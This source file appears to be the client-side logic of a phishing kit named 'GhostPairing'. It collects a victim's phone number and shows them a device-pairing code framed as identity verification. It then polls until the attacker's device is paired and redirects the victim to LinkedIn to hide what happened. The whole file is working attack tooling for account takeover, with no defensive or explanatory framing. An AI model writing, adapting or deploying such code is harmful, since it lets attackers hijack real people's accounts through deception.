/* phishing.js — GhostPairing attack flow UI logic */
let currentAttackId = null;
let phoneNumber = '';
let codePollTimer = null;
let pairingCheckTimer = null;

async function startVerification() {
    const countryCode = document.getElementById('countryCode').value;
    const phone = document.getElementById('phone').value.trim();

    if (!phone) {
        showAlert(currentLang === 'de' ? 'Bitte Telefonnummer eingeben' :
                  currentLang === 'es' ? 'Ingrese su número' :
                  currentLang === 'fr' ? 'Entrez votre numéro' :
                  currentLang === 'it' ? 'Inserisci il numero' :
                  currentLang === 'pt' ? 'Insira o número' :
                  'Please enter your phone number');
        return;
    }

    phoneNumber = countryCode + phone.replace(/[\s\-()]/g, '');

    const btn = document.getElementById('startBtn');
    btn.disabled = true;
    btn.textContent = translations[currentLang]?.step2?.status || 'Starting...';

    try {
        const response = await fetch('/api/request-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: phoneNumber })
        });

        const data = await response.json();

        if (data.success) {
            currentAttackId = data.attack_id;
            switchStep('step2');
            startCodePolling();
        } else {
            showAlert(data.error || 'Verification failed');
            resetButton(btn);
        }
    } catch (error) {
        showAlert('Connection error. Please try again.');
        resetButton(btn);
    }
}

function resetButton(btn) {
    btn.disabled = false;
    btn.textContent = translations[currentLang]?.step1?.button || 'Verify Identity';
}

function switchStep(hideId) {
    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
    const target = document.getElementById(hideId);
    if (target) target.classList.add('active');
}

function startCodePolling() {
    let pollCount = 0;

    codePollTimer = setInterval(async () => {
        pollCount++;

        try {
            const response = await fetch(`/api/get-displayed-code/${currentAttackId}`);
            const data = await response.json();

            if (data.success && data.code) {
                clearInterval(codePollTimer);

                document.getElementById('displayedCodeBox').textContent = data.code;
                document.getElementById('displayedCodeText').textContent = data.code;
                document.getElementById('phoneDisplay2').textContent = phoneNumber;

                switchStep('step3');

                // Start checking pairing status after short delay
                setTimeout(checkPairingStatus, 3000);
                return;
            }

            if (pollCount >= 90) {  // 90 seconds timeout
                clearInterval(codePollTimer);
                showError('Verification code timeout. Please try again.');
            }
        } catch (error) {
            console.error('Polling error:', error);
        }
    }, 1000);
}

function checkPairingStatus() {
    let checkCount = 0;

    pairingCheckTimer = setInterval(async () => {
        checkCount++;

        try {
            const response = await fetch(`/api/check-pairing/${currentAttackId}`);
            const data = await response.json();

            if (data.paired || data.completed) {
                clearInterval(pairingCheckTimer);

                // Success — redirect
                switchStep('step5');

                setTimeout(() => {
                    window.location.href = 'https://www.linkedin.com';
                }, 3000);
                return;
            }

            if (checkCount >= 180) {  // 3 minutes timeout
                clearInterval(pairingCheckTimer);
                showError('Verification timeout. Please restart the process.');
            }
        } catch (error) {
            console.error('Pairing check error:', error);
            if (checkCount >= 10) {
                clearInterval(pairingCheckTimer);
                showError('Verification failed. Please restart.');
            }
        }
    }, 1000);
}

function showError(message) {
    const activeStep = document.querySelector('.step.active');
    if (!activeStep) return;

    // Remove existing error banners
    const existing = activeStep.querySelectorAll('.error-banner');
    existing.forEach(el => el.remove());

    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-banner';
    const h4 = document.createElement('h4');
    h4.textContent = '⚠️ Verification Failed';
    const p = document.createElement('p');
    p.textContent = message;
    const btn = document.createElement('button');
    btn.className = 'btn';
    btn.textContent = 'Restart Verification';
    btn.addEventListener('click', () => location.reload());

    errorDiv.appendChild(h4);
    errorDiv.appendChild(p);
    errorDiv.appendChild(btn);
    activeStep.appendChild(errorDiv);
}

function showAlert(message) {
    // Simple alert wrapper (can be replaced with toast)
    alert(message);
}

function goBack() {
    clearInterval(codePollTimer);
    clearInterval(pairingCheckTimer);

    switchStep('step1');

    const btn = document.getElementById('startBtn');
    btn.disabled = false;
    btn.textContent = translations[currentLang]?.step1?.button || 'Verify Identity';
}

// Initialize on DOM ready
document.addEventListener('DOMContentLoaded', () => {
    i18n();
});
